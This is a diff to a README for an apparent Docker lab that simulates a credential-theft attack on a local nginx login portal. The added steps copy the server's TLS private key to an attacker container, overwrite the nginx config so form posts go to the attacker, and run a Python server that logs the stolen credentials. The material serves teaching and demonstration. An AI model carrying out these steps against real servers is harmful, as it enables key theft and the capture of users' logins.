@@ -139,7 +139,44 @@ nginx -s reload
 ```
 ### Manual Mode Finished
 You should now be able to go to https://localhost and log in to a web portal and see a homepage.
+</br>
+<img src="readmeImages/loginPage.png" alt="Login Page" width="500"/>
+<img src="readmeImages/landingPage.png" alt="Landing Page" width="500"/>
+
 ### Manual Mode Attack
 Now lets execute an attack against the web server by forwarding post requests to the attack container. This attack container will steal the credentials of the user logging in.
 #### Copy the certificates from the web_server to the attacker
-TODO
+```
+# Copy public and private keys from web server to simulate stolen certs
+docker cp web_server:/etc/ssl/private/nginx-selfsigned.key .
+docker cp web_server:/etc/ssl/certs/nginx-selfsigned.crt .
+
+# Copy stolen certs to attackers machine so they can serve malicious webpage
+docker exec -i attacker sh -c 'cat > /simple-https-python-server/nginx-selfsigned.crt' < ./nginx-selfsigned.crt
+docker exec -i attacker sh -c 'cat > /simple-https-python-server/nginx-selfsigned.key' < ./nginx-selfsigned.key
+
+# Remove intermediate cert files from machine running this script
+rm -f nginx-selfsigned.crt
+rm -f nginx-selfsigned.key
+```
+#### Modify c2_config.c2 file
+This will modify the c2 config file to route traffice to the attackers machine when the form is submitted.
+```
+# Change c2_config.c2 file to route traffic to attackers machine
+docker exec -i web_server sh -c 'cat > /etc/nginx/conf.d/default.conf' < ./nginx/c2_config_malicious.c2
+docker exec -i web_server sh -c 'nginx -s reload'
+```
+#### Launch Attacker python web server
+Now we will launch the python web server to log the credentials submitted from the login page
+Do the following in the attacker terminal
+```
+# Launch simple_https.py on attacker system
+cd simple-https-python-server
+python3 simple_https.py
+```
+#### Test the attack
+Leave the attacker terminal open and log into the web page with some credentials. Notice the new website that shows up and the stolen credentials in the attackers terminal.
+</br>
+<img src="readmeImages/loginPage.png" alt="Login Page" width="500"/>
+<img src="readmeImages/landingPage.png" alt="Landing Page" width="500"/>
+<img src="readmeImages/attackerTerminal.png" alt="Attacker Terminal" width="500"/>
